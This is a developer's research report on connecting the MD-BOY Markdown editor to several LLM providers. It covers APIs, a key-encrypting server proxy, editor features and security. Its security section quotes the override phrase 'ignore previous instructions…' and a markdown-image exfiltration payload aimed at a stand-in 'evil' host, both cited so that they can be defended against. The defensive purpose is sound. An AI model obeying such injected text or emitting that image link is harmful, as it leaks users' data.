# LLM integration for MD-BOY: research report

> **Status:** research only. Nothing in this document is implemented yet.
> **Checked:** 2026-09-24, against the official provider docs listed under [Sources](#sources).
> Anything I could not confirm is marked **(unverified)**. Model names and prices change often,
> so the app should read model lists from the provider APIs instead of hard-coding them.

## TL;DR

- **Feasible:** yes. All the providers below offer streaming HTTP APIs that a Node 22 server can call with the built-in `fetch`, so no SDKs are needed.
- **Recommended architecture:** users **bring their own API key (BYOK)**. Keys are **encrypted at rest (AES-256-GCM)**, and all calls go through a **server proxy** (`POST /api/llm/chat`) that turns every provider's stream into **one normalized SSE stream** for the frontend.
- **Three adapters cover almost everything:** a generic **OpenAI-compatible** adapter (OpenAI, Mistral, OpenRouter, Ollama, LM Studio, and Gemini's compat layer), a native **Anthropic** adapter, and a native **Gemini** adapter.
- **First step:** build the credentials table, the encryption helper and the OpenAI-compatible and Anthropic adapters, then a minimal chat panel that uses the current document as context (milestone M1 below).

---

## 1. Providers

### 1.1 At a glance

| Provider | Auth | Chat endpoint | Stream format | Browser CORS¹ | Free tier |
|---|---|---|---|---|---|
| Anthropic | `Authorization: Bearer` (or legacy `x-api-key`) + `anthropic-version: 2023-06-01` | `POST https://api.anthropic.com/v1/messages` | Named SSE events | Yes, with opt-in header² | Small starter credits only |
| OpenAI | `Authorization: Bearer` | `POST https://api.openai.com/v1/chat/completions` or `/v1/responses` | Data-only SSE, ends `[DONE]` (Chat); named events (Responses) | Yes | Unclear, treat as paid³ |
| Google Gemini | `x-goog-api-key` | `POST https://generativelanguage.googleapis.com/v1beta/models/{model}:streamGenerateContent?alt=sse` | Data-only SSE of partial responses | Yes | **Yes** (Flash models, low limits) |
| Mistral | `Authorization: Bearer` | `POST https://api.mistral.ai/v1/chat/completions` | OpenAI-style, ends `[DONE]` | Yes (`*`) | Yes, "free mode" |
| OpenRouter | `Authorization: Bearer` | `POST https://openrouter.ai/api/v1/chat/completions` | OpenAI-style + `:` comment keep-alives | Yes (`*`) | `:free` models, rate-limited |
| Ollama (local) | None locally (key ignored) | `POST http://localhost:11434/v1/chat/completions` | OpenAI-style | Only for allowed origins (`OLLAMA_ORIGINS`) | Free (your hardware) |
| LM Studio (local) | None by default | `POST http://localhost:1234/v1/chat/completions` | OpenAI-style | Off by default ("Enable CORS") | Free (your hardware) |

¹ On 2026-09-24 I sent a CORS preflight (`OPTIONS` with `Origin: https://example.com`) to each cloud endpoint. All of them allowed the origin and the auth headers. The preflight result for Gemini assumes only `content-type, x-goog-api-key` are requested.
² See the Anthropic notes below.
³ See the OpenAI notes below.

### 1.2 Anthropic (Claude) Messages API

- **Endpoint:** `POST https://api.anthropic.com/v1/messages`. **Headers:** `Authorization: Bearer <key>`, where the API overview calls `x-api-key` a "legacy fallback, still supported", plus `anthropic-version: 2023-06-01` (required) and `content-type: application/json`.
- **Body:** `model`, `max_tokens` (required), top-level `system` (a string, not a message), and `messages[]` with `user`/`assistant` turns.
- **Streaming (`"stream": true`):** named SSE events `message_start`, then per content block `content_block_start`, `content_block_delta`, `content_block_stop`, then `message_delta` (stop reason and usage) and `message_stop`. The text arrives in `content_block_delta` as `delta.type === "text_delta"` / `delta.text`. The stream can also contain `ping` events and `error` events such as `overloaded_error` in the middle.
- **Models:** `GET /v1/models`. This also works as a cheap way to check that a key is valid.
- **Browser:** the preflight succeeds, but direct browser use needs the opt-in header `anthropic-dangerous-direct-browser-access: true`. The official TypeScript SDK blocks browsers unless you set `dangerouslyAllowBrowser: true`, "to avoid exposing your secret API credentials". I found the header itself described in the SDK docs and Simon Willison's write-up, not in the API reference pages I read. I did not confirm the exact rejection message without a valid key **(unverified)**.
- **OpenAI-compatible layer:** `https://api.anthropic.com/v1/` exists, but Anthropic says it is "primarily intended to test and compare model capabilities, and is not considered a long-term or production-ready solution". It also silently ignores fields like `response_format`. **Use a native adapter.**
- **Free tier:** none ongoing. "New users receive a small amount of free credits."
- **Pricing:** per million tokens, e.g. Claude Haiku 4.5 costs $1 in / $5 out and Claude Sonnet 5 costs $2 / $10 as of today. See the [pricing page](https://platform.claude.com/docs/en/about-claude/pricing).

### 1.3 OpenAI (Chat Completions and Responses)

- **Auth:** `Authorization: Bearer <key>` against `https://api.openai.com/v1`.
- **Chat Completions** (`POST /v1/chat/completions`): `messages[]` with `system`/`user`/`assistant` roles. With `stream: true`, each SSE `data:` line is a `chat.completion.chunk` with text in `choices[0].delta.content`, and the stream ends with `data: [DONE]`. Send `stream_options: {"include_usage": true}` to get token usage in the final chunk.
- **Responses** (`POST /v1/responses`): top-level `instructions` plus `input`, with named SSE events such as `response.output_text.delta`. OpenAI: "While Chat Completions remains supported, Responses is recommended for all new projects."
- **For MD-BOY:** Chat Completions is the format everyone else copies, so the generic adapter should speak it. A Responses code path for OpenAI can be added later if a feature needs it.
- **Browser:** CORS preflight allowed. The official JS SDK requires `dangerouslyAllowBrowser` for browser use.
- **Free tier:** the rate-limit guide lists a "Free" usage tier for supported countries. I could not confirm which models it can call without a payment method **(unverified)**, so treat OpenAI as paid. See the [pricing page](https://developers.openai.com/api/docs/pricing).

### 1.4 Google Gemini API

- **Auth:** header `x-goog-api-key: <key>`. A `?key=` query parameter also works, but URLs tend to end up in logs, so use the header.
- **Native endpoint:** `POST https://generativelanguage.googleapis.com/v1beta/models/{model}:streamGenerateContent?alt=sse` (non-streaming: `:generateContent`). The body has `contents[]` (roles `user`/`model`, text in `parts[{text}]`), `systemInstruction`, and `generationConfig` (e.g. `maxOutputTokens`). Each SSE `data:` event is a partial response with text in `candidates[0].content.parts[].text`. There is no `[DONE]` sentinel.
- **New Interactions API** (`POST /v1beta/interactions`): "Generally Available and recommended for all new projects" as of June 2026. `generateContent` is "now considered legacy" but "remains fully supported". Starting on `streamGenerateContent` is fine, but plan to revisit.
- **OpenAI compatibility:** `https://generativelanguage.googleapis.com/v1beta/openai/` (chat completions with streaming, and models). Google says it is "still in beta". This makes it a reasonable **stop-gap** before a native Gemini adapter exists.
- **Free tier:** yes, for several Flash / Flash-Lite models, with lower RPM/TPM/RPD limits. Important for privacy: the pricing page marks free-tier content as **"used to improve our products"**, and users must be told this. See the [pricing](https://ai.google.dev/gemini-api/docs/pricing) and [rate limits](https://ai.google.dev/gemini-api/docs/rate-limits) pages.

### 1.5 Mistral

- **Endpoint:** `POST https://api.mistral.ai/v1/chat/completions`, `Authorization: Bearer`. It follows the OpenAI format. Streaming sends "data-only server-side events … terminated by a `data: [DONE]` message". Models: `GET /v1/models`.
- **Browser:** preflight returns `Access-Control-Allow-Origin: *`.
- **Free tier:** "Free mode (default): limited limits for testing and prototyping". Turning on pay-as-you-go unlocks higher tiers. Mistral's help center says input and output data may be used for training unless you opt out under Admin > Privacy. The wording differs between pages, so users should check this themselves **(partly unverified)**. See the [pricing page](https://mistral.ai/pricing).

### 1.6 OpenRouter (one API, many models)

- **Endpoint:** `POST https://openrouter.ai/api/v1/chat/completions`, `Authorization: Bearer`. It is OpenAI-compatible, and models are addressed as `vendor/model`. Optional attribution headers: `HTTP-Referer` and `X-OpenRouter-Title` (or `X-Title`).
- **Streaming:** OpenAI-style chunks plus SSE **comment lines** (e.g. `: OPENROUTER PROCESSING`) that must be ignored. The stream ends with `data: [DONE]`.
- **OAuth PKCE:** a user can click "Connect OpenRouter", go to `https://openrouter.ai/auth?callback_url=…`, and come back with a code. The app exchanges the code at `POST https://openrouter.ai/api/v1/auth/keys` for "a user-controlled API key". This is the smoothest BYOK UX available (no copy-pasting keys).
- **Free:** models with IDs ending in `:free` allow 20 requests/min and 50 requests/day, or 1000/day once at least $10 of credits has been bought.
- **Pricing:** provider prices are passed through "without any markup". There is a 5.5% fee ($0.80 minimum) on card credit purchases. See the [model list](https://openrouter.ai/models).
- **Why it matters here:** a single OpenRouter key gives a user Claude, GPT, Gemini, Mistral, Llama and more through the generic adapter.

### 1.7 Local: Ollama and LM Studio

- **Ollama:** OpenAI-compatible at `http://localhost:11434/v1/` (`/chat/completions`, `/models`, and `/responses` since v0.13.3). The API key is "required but ignored" locally. There is also an Anthropic-compatible `/v1/messages`, and a hosted option at `https://ollama.com/v1` that uses an API key. **CORS:** by default only `127.0.0.1` and `0.0.0.0` origins are allowed, so the MD-BOY origin has to be added to `OLLAMA_ORIGINS`. Ollama binds to `127.0.0.1:11434`, and `OLLAMA_HOST` exposes it on a network.
- **LM Studio:** OpenAI-compatible at `http://localhost:1234/v1` (`/models`, `/chat/completions`, `/responses`, `/completions`, `/embeddings`). **CORS is off by default**. Turn on "Enable CORS" in the server settings or run `lms server start --cors`. I did not check whether it has an Anthropic-compatible endpoint **(unverified)**.
- **Browser caveat:** since Chrome 142, a public website that fetches `localhost` or a LAN IP triggers a **Local Network Access permission prompt**. Chrome 145 splits this into "local-network" and "loopback-network" permissions. I have not checked Safari and Firefox behaviour for HTTPS pages calling `http://localhost` **(unverified)**.

---

## 2. Architecture options

### (a) BYOK + server proxy, keys encrypted at rest (**recommended**)
The user pastes a key (or connects OpenRouter through OAuth). The server encrypts it and stores it in `llm_credentials`. The browser calls `/api/llm/chat` with its session cookie, and the server decrypts the key, calls the provider and streams the answer back.
- **Pros:** the key never reaches the browser again after it is saved, so XSS or a malicious browser extension cannot read it later. **No cost to the owner**, which suits a project without monetization. One place for rate limits, size caps and logging rules. Provider differences are hidden behind one SSE format. Keys follow the user across devices.
- **Cons:** the server holds sensitive secrets (encryption, a secret-management plan and a breach plan are needed). Document text passes through the MD-BOY server. The server holds long-lived streaming connections. A custom `base_url` brings **SSRF** risk (§4).

### (b) Server-owned keys shared by all users
- **Pros:** zero setup for users, and the simplest UX.
- **Cons:** **the owner pays for every token** with no revenue to cover it. Abuse (free-LLM farming) is likely on any public signup. Heavy per-user quotas are needed. Provider terms may require accountability for end-user content. It is only sensible for a private or self-hosted instance with trusted users, or as an admin-only option for a single free-tier Gemini/OpenRouter key with strict quotas.

### (c) Browser-direct calls (key kept in the browser)
- **Pros:** no server work or streaming load. Document text never touches MD-BOY's server. It works with every provider in §1 thanks to CORS.
- **Cons:** the key sits in `localStorage` or memory, where any XSS (a real risk in a Markdown app that renders HTML previews) or extension can steal it. The providers themselves label this "dangerous". Every provider format has to be handled in the frontend bundle. There are no server-side limits. Keys do not follow the user across devices.

### (d) Local models (Ollama / LM Studio)
- **Pros:** complete privacy, no API costs, works offline.
- **Cons:** needs a capable machine. Quality varies by model. **A hosted MD-BOY server cannot reach a user's `localhost`**, so this only works (1) **browser-direct** (safe here because there is no secret key, but it needs `OLLAMA_ORIGINS` or LM Studio CORS plus the Chrome LNA prompt), or (2) when MD-BOY is **self-hosted** on the same machine or LAN, so the proxy can reach it.

### Comparison

| | Owner cost | Key exposure | Setup for user | Works for hosted MD-BOY | Privacy |
|---|---|---|---|---|---|
| (a) BYOK + proxy | none | server only (encrypted) | paste key / OAuth | yes | provider + MD-BOY server |
| (b) shared keys | **high** | server only | none | yes | provider + MD-BOY server |
| (c) browser-direct | none | **browser** | paste key | yes | provider only |
| (d) local | none | none | install + CORS | only via browser-direct | **fully local** |

**Recommendation:** make **(a)** the default path. Add **(d)** later as an optional "local model" mode that uses the same normalized chat stream but calls the local server from the browser (hosted deployments), or through the proxy when an admin setting allows private hosts (self-hosted deployments). Do not offer (b) on a public instance.

### 2.1 Request flow

```
Browser (CodeMirror + chat panel)
  └─ fetch POST /api/llm/chat  {credentialId, model, action, messages, context}   (session cookie)
       └─ Express: auth → rate limit → size caps → load + decrypt key → build prompt
            └─ adapter.chat(...)  ──HTTPS──▶  provider (SSE / NDJSON)
            ◀─ normalized SSE: event: delta / done / error   (AbortController on client disconnect)
```

### 2.2 Adapter interface

```js
// server/llm/adapters/<name>.js — each adapter exports the same shape
/**
 * @param {{ apiKey?: string, baseUrl?: string, model: string, system?: string,
 *           messages: {role:'user'|'assistant', content:string}[],
 *           maxTokens?: number, temperature?: number, signal?: AbortSignal }} req
 * @returns {AsyncIterable<{type:'text', text:string}
 *                        | {type:'done', usage?:{inputTokens:number, outputTokens:number}, stopReason?:string}>}
 */
export async function* chat(req) { /* fetch(..., {signal}) → parse SSE → yield deltas */ }
export async function listModels({ apiKey, baseUrl }) { /* → [{id, label}] */ }
```

This is the requested `chat({messages, model, system}) → async iterator of text deltas`, extended with one final `done` item so usage can be recorded. All three adapters can share one small SSE line parser, which reads `response.body` through `TextDecoderStream`, splits on blank lines and skips `:` comment lines.

| Adapter | Covers | Normalization work |
|---|---|---|
| `openai-compatible` | OpenAI, Mistral, OpenRouter, Ollama, LM Studio, Gemini `/openai/`, any custom base URL | `system` → first message. Read `choices[0].delta.content`. Stop at `[DONE]`. |
| `anthropic` | Claude | `system` stays top-level, `max_tokens` is required. Read only `text_delta`. Surface mid-stream `error` events. |
| `gemini` | Gemini native (later: Interactions API) | Role `assistant` → `model`, text → `parts`. Read `candidates[0].content.parts[].text`. |

**Wire format to the browser** (the same for every provider):

```
event: delta   data: {"text":"Hello"}
event: done    data: {"usage":{"inputTokens":812,"outputTokens":95},"stopReason":"end_turn"}
event: error   data: {"code":"rate_limited","message":"Provider rate limit, retry in 20s"}
: ping                                  (comment every ~15 s to keep proxies from closing the connection)
```

Server notes for Express 5: set `Content-Type: text/event-stream`, `Cache-Control: no-cache` and `X-Accel-Buffering: no` (for nginx), and call `res.flushHeaders()`. Exclude this route from compression middleware. On `req.on('close')`, abort the upstream `fetch`, because a stopped generation should also stop the user's bill. On the client, `EventSource` cannot POST, so read the stream with `fetch` + `response.body.getReader()`.

---

## 3. Editor use cases and UX

| Feature | Context sent | UX |
|---|---|---|
| **Chat side panel** | Whole document or current selection (toggle), plus chat history | Collapsible right panel with a model picker, a "context: document (≈3.2k tokens)" chip, a Stop button and streaming Markdown. Answers get "Insert at cursor" and "Replace selection" buttons. |
| **Selection actions:** rewrite, shorten, expand, summarize, translate (language picker), fix grammar/spelling, change tone | Selection plus a small window of surrounding text for style | Floating toolbar or `Mod-J` menu when text is selected. Results go to **diff review**, never straight into the document. |
| **Continue writing** | Text before the cursor (last N chars) plus document title | Inline "ghost text" (a CodeMirror decoration). `Tab` accepts, `Esc` dismisses. |
| **Outline / TOC** | Whole document | "Generate outline" produces a Markdown list for review. A TOC can be built **deterministically from headings without an LLM**. The LLM is only needed for summaries or suggested structure. |
| **Suggested edits as a diff** | The proposal plus the original range | Use `@codemirror/merge`. `unifiedMergeView` supports `mergeControls` with per-chunk accept/reject (`acceptChunk`, `rejectChunk`). The MVP can offer "Apply all / Discard". |
| **Slash commands** | Depends on command | Type `/` at line start to open an `@codemirror/autocomplete` list: `/ask`, `/continue`, `/summarize`, `/outline`, `/translate fr`, `/fix`, `/table` (text → Markdown table). |

UX principles:
- **Human-in-the-loop edits.** The model only proposes, and the user applies. Apply each accepted change as one CodeMirror transaction so `Mod-Z` undoes it in one step.
- **Transparency.** Always show which provider and model will receive the text, and roughly how much text that is. Show an explicit indicator whenever the whole document is being sent.
- **Prompt shape for edits.** Ask for "only the replacement text, no preamble, keep Markdown formatting". Scope edits to a selection or a section rather than asking for patch formats, because asking for full-document rewrites is costly and fragile.
- **Per-document opt-out.** A "never send this document to AI" flag is cheap to add and reassuring for users.

---

## 4. Security and privacy

**API keys**
- Encrypt with **AES-256-GCM** (`crypto.createCipheriv('aes-256-gcm', key, iv)`) using a random 12-byte IV per record. Store `v1:<iv>:<authTag>:<ciphertext>` (base64) so the key can be rotated later.
- The 32-byte key comes from an env secret (e.g. `LLM_ENCRYPTION_KEY`, base64) or is derived from the existing server secret with `crypto.hkdfSync('sha256', …, 'mdboy-llm-v1', 32)`. The secret must **never** be stored in the SQLite file or the repo, so a leaked DB backup does not leak keys.
- Pass `user_id + provider` as **AAD** (`cipher.setAAD`), so ciphertext copied to another user's row fails to decrypt.
- **Never send keys back to the client.** The API returns only `{id, provider, label, base_url, created_at, hint:"…a1b2"}`. To replace a key, the user deletes it and adds a new one. Check a new key with a cheap `GET /models` before saving it.
- Delete a user's credentials when their account is deleted (`ON DELETE CASCADE`).

**SSRF through `base_url`**
- The proxy fetches whatever URL a credential names. By default, **allow only the known provider hosts**.
- Custom base URLs, including private and loopback ranges such as Ollama on `localhost`, stay off unless an admin enables them (e.g. `LLM_ALLOW_CUSTOM_BASE_URL=1` on self-hosted installs). Even then, require HTTPS for non-local hosts, resolve DNS and block link-local/metadata IPs (`169.254.169.254`), and do not follow redirects. See the OWASP SSRF cheat sheet.

**Abuse, rate and cost limits** (suggested starting values)
- Per user: about 20 chat requests/min and about 300/day, at most 2 concurrent streams, and a login requirement.
- Caps: input context of about 200k characters (the UI warns and truncates), a server-enforced `max_tokens` (default 2048, hard cap 8192) and an idle timeout of about 120 s.
- Keep an `llm_usage` table (user, provider, model, input/output tokens, timestamp) so users can see what they spent. It should never contain prompt text.
- Map provider `429`/`529` responses to a friendly `rate_limited` error. Do not retry automatically inside a stream.

**Disclosure and consent**
- Show a one-time consent dialog per provider: "The selected text or document will be sent to *Provider* under their terms." Link each provider's privacy and data-use page.
- Call out specifically that **Gemini free-tier content is used to improve Google's products**, and that Mistral may use data for training unless the user opts out.
- Local models get a "stays on your machine" badge.
- Update MD-BOY's privacy text: document content passes through the MD-BOY server and is not stored or logged there.

**Prompt injection** (OWASP LLM01:2025)
- Document text is untrusted input. A shared or pasted document can contain "ignore previous instructions…".
- Mitigations: put the document inside clear delimiters (`<document>…</document>`) with a system instruction to treat it as data, **give the model no tools or actions** in v1 (it can only return text), and require the user to review every edit through the diff UI.

**Output handling**
- Render model Markdown with the same sanitizer as the preview (e.g. DOMPurify), and never pass model output to `innerHTML` raw.
- **Block remote images and auto-fetched links in chat output.** An injected `![](https://evil/?q=<secret>)` is a known way to exfiltrate data. Use a CSP `img-src` restriction or strip remote images.

**CSRF and sessions**
- `/api/llm/*` are state-changing, cookie-authenticated POST/DELETE routes. Make sure the app's existing CSRF defence (SameSite cookies plus an origin check or token) covers them.

**Logging hygiene**
- Never log request bodies, prompts, completions, `Authorization`/`x-api-key`/`x-goog-api-key` headers, or decrypted keys.
- Log only request ID, user ID, provider, model, token counts, latency and status.
- Redact provider error bodies before logging, because some echo part of the input.
- Do not store chat history on the server in v1. Keep it in memory in the browser (optionally `sessionStorage`).

---

## 5. Implementation sketch (later phase)

### 5.1 Database (node:sqlite)

```sql
CREATE TABLE llm_credentials (
  id            INTEGER PRIMARY KEY,
  user_id       INTEGER NOT NULL REFERENCES users(id) ON DELETE CASCADE,
  provider      TEXT    NOT NULL CHECK (provider IN
                  ('anthropic','openai','gemini','mistral','openrouter','openai_compatible')),
  label         TEXT    NOT NULL,          -- "Work OpenAI key"
  base_url      TEXT,                      -- NULL = provider default; custom only if admin allows
  encrypted_key TEXT,                      -- "v1:iv:tag:ct"; NULL for keyless local endpoints
  created_at    TEXT    NOT NULL DEFAULT (datetime('now'))
  -- optional: key_hint TEXT (last 4 chars), last_used_at TEXT
);
CREATE INDEX idx_llm_credentials_user ON llm_credentials(user_id);

-- optional, for quotas and a "usage" view
CREATE TABLE llm_usage (id INTEGER PRIMARY KEY, user_id INTEGER NOT NULL, provider TEXT, model TEXT,
  input_tokens INTEGER, output_tokens INTEGER, created_at TEXT DEFAULT (datetime('now')));
```

### 5.2 Endpoints (all require a session)

| Method and path | Body / query | Response |
|---|---|---|
| `GET /api/llm/credentials` | none | `[{id, provider, label, base_url, hint, created_at}]` (never the key) |
| `POST /api/llm/credentials` | `{provider, label, apiKey, baseUrl?}` | Validates the key through `listModels`, encrypts it, returns `201 {id, …}` |
| `DELETE /api/llm/credentials/:id` | none | `204`. Scoped to `user_id`, `404` if not owned. |
| `GET /api/llm/models?credentialId=` | none | `[{id, label}]`, cached in memory for about 1 h per credential |
| `POST /api/llm/chat` | `{credentialId, model, action?, messages[], context?:{kind:'document'\|'selection', text}}` | `text/event-stream` with `delta`/`done`/`error` events (§2.2) |
| *(later)* `GET /api/llm/oauth/openrouter/callback` | `code` | Exchanges the PKCE code, stores the key, redirects to settings |

The server owns the **prompt templates** for each `action` (`rewrite`, `summarize`, `translate`, `continue`, …). The client sends the action name and the text, not a raw system prompt, which keeps injection defences and prompt tuning in one place.

### 5.3 File layout

```
server/llm/
  index.js              # express.Router(): mounts the routes above
  crypto.js             # encryptKey / decryptKey (AES-256-GCM, HKDF, AAD)
  credentials.js        # DB access for llm_credentials (always filtered by user_id)
  providers.js          # registry: provider → {adapter, defaultBaseUrl, allowedHosts}
  prompts.js            # system prompts + action templates, <document> wrapping
  limits.js             # per-user rate limit, concurrency, size caps
  sse.js                # parseSSE(readable) for upstream + writeEvent(res, …) for downstream
  adapters/
    openai-compatible.js
    anthropic.js
    gemini.js
src/llm/                # frontend (vanilla JS + CodeMirror 6)
  api.js                # fetch wrapper + SSE reader with AbortController
  settings-panel.js     # add/remove keys, provider picker, consent text
  chat-panel.js         # side panel, history in memory, streaming render (sanitized)
  selection-actions.js  # floating toolbar / Mod-J menu
  diff-review.js        # @codemirror/merge unifiedMergeView with mergeControls
  slash-commands.js     # @codemirror/autocomplete source for "/"
  ghost-text.js         # continue-writing decoration (later milestone)
```

New frontend dependency: `@codemirror/merge`, plus `@codemirror/autocomplete` if it is not already used. The server needs **no** new runtime dependency, since Node 22 has `fetch`, web streams and `crypto` built in.

### 5.4 Effort (one developer who knows the codebase, rough)

| Piece | Estimate |
|---|---|
| Crypto helper, `llm_credentials`, credential endpoints, settings UI | 1.5–2 days |
| SSE parser, `openai-compatible` + `anthropic` adapters, `/chat` + `/models`, abort handling, tests with recorded streams | 2–3 days |
| Chat panel (streaming, stop, document/selection context, sanitized render) | 2–3 days |
| Selection actions + diff review with accept/reject | 2–3 days |
| `gemini` native adapter | 0.5–1 day |
| Rate limits, usage table, logging review, consent dialogs, SSRF allowlist | 1–1.5 days |
| Slash commands + continue-writing ghost text | 1.5–2 days |
| Optional: OpenRouter OAuth PKCE, local-model browser-direct mode | 1–2 days each |
| **MVP (M1–M2)** | **about 1.5–2 weeks**. The full feature set is about 3–4 weeks. |

### 5.5 Milestones

1. **M0, decisions (0.5 day):** confirm BYOK-only, write the privacy/consent text, choose the default caps.
2. **M1, "chat with my document":** credentials (OpenAI-compatible + Anthropic), `/api/llm/chat` streaming, chat panel with the document or selection as context. Users with OpenAI, OpenRouter, Mistral, Ollama-via-proxy (self-hosted) or Claude keys can already use it.
3. **M2, "edit with AI":** selection actions (rewrite, summarize, translate, fix grammar), diff review with accept/reject, usage table and rate limits.
4. **M3, "writing flow":** slash commands, continue-writing ghost text, outline generation, native Gemini adapter.
5. **M4, "more ways to connect":** OpenRouter OAuth PKCE, browser-direct local models (Ollama/LM Studio with an origin setup guide), and possibly Gemini Interactions API / OpenAI Responses adapters if features need them.

---

## 6. Conclusion

**Yes, linking MD-BOY to many LLMs is feasible and fits the current stack well.** Node 22's built-in `fetch` and streams, Express 5 SSE and CodeMirror 6's merge and autocomplete packages cover all the technical needs without SDKs. Because there is no monetization, **bring-your-own-key through an encrypted server proxy** is the right model. The owner pays nothing, keys stay off the client, and one normalized stream hides the differences between providers. Three adapters (OpenAI-compatible, Anthropic, Gemini) reach every provider researched here, including local models.

**Recommended first step:** implement milestone **M1**, meaning `server/llm/crypto.js`, the `llm_credentials` table and endpoints, the `openai-compatible` and `anthropic` adapters behind `POST /api/llm/chat`, and a minimal chat panel. Ship it with the consent dialog and logging rules from §4 from day one.

---

## Sources

- Anthropic: [API overview (auth headers)](https://platform.claude.com/docs/en/api/overview) · [Messages API](https://platform.claude.com/docs/en/api/messages) · [Streaming](https://platform.claude.com/docs/en/build-with-claude/streaming) · [OpenAI SDK compatibility](https://platform.claude.com/docs/en/api/openai-sdk) · [TypeScript SDK (browser usage)](https://platform.claude.com/docs/en/cli-sdks-libraries/sdks/typescript) · [Pricing](https://platform.claude.com/docs/en/about-claude/pricing) · [Simon Willison on `anthropic-dangerous-direct-browser-access`](https://simonwillison.net/2024/Aug/23/anthropic-dangerous-direct-browser-access/)
- OpenAI: [Migrate to Responses](https://developers.openai.com/api/docs/guides/migrate-to-responses) · [Streaming responses](https://developers.openai.com/api/docs/guides/streaming-responses) · [Chat Completions streaming events](https://developers.openai.com/api/reference/resources/chat/subresources/completions/streaming-events) · [Rate limits / usage tiers](https://developers.openai.com/api/docs/guides/rate-limits) · [Pricing](https://developers.openai.com/api/docs/pricing)
- Google Gemini: [generateContent / streamGenerateContent reference](https://ai.google.dev/api/generate-content) · [Interactions API](https://ai.google.dev/gemini-api/docs/interactions) · [OpenAI compatibility](https://ai.google.dev/gemini-api/docs/openai) · [Pricing](https://ai.google.dev/gemini-api/docs/pricing) · [Rate limits](https://ai.google.dev/gemini-api/docs/rate-limits)
- Mistral: [API reference](https://docs.mistral.ai/api/) · [Rate limits and tiers](https://help.mistral.ai/en/articles/698531-why-am-i-hitting-api-rate-limits-and-how-do-i-increase-them) · [Training opt-out](https://help.mistral.ai/en/articles/455207-can-i-opt-out-of-my-input-or-output-data-being-used-for-training) · [Pricing](https://mistral.ai/pricing)
- OpenRouter: [API reference](https://openrouter.ai/docs/api/reference/overview) · [OAuth PKCE](https://openrouter.ai/docs/guides/overview/auth/oauth) · [Limits (free models)](https://openrouter.ai/docs/api/reference/limits) · [FAQ (fees)](https://openrouter.ai/docs/faq) · [Models](https://openrouter.ai/models)
- Local: [Ollama OpenAI compatibility](https://docs.ollama.com/api/openai-compatibility) · [Ollama Anthropic compatibility](https://docs.ollama.com/api/anthropic-compatibility) · [Ollama FAQ (CORS, OLLAMA_HOST)](https://docs.ollama.com/faq) · [LM Studio OpenAI compatibility](https://lmstudio.ai/docs/developer/openai-compat) · [LM Studio `server start --cors`](https://lmstudio.ai/docs/cli/serve/server-start) · [Chrome Local Network Access](https://developer.chrome.com/blog/local-network-access)
- Security and editor: [OWASP LLM01:2025 Prompt Injection](https://genai.owasp.org/llmrisk/llm01-prompt-injection/) · [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html) · [Node.js crypto (AES-GCM, HKDF)](https://nodejs.org/docs/latest-v22.x/api/crypto.html) · [CodeMirror reference (`@codemirror/merge`, autocomplete)](https://codemirror.net/docs/ref/)
- CORS preflight results in §1.1 come from my own `OPTIONS` requests to each API on 2026-09-24.
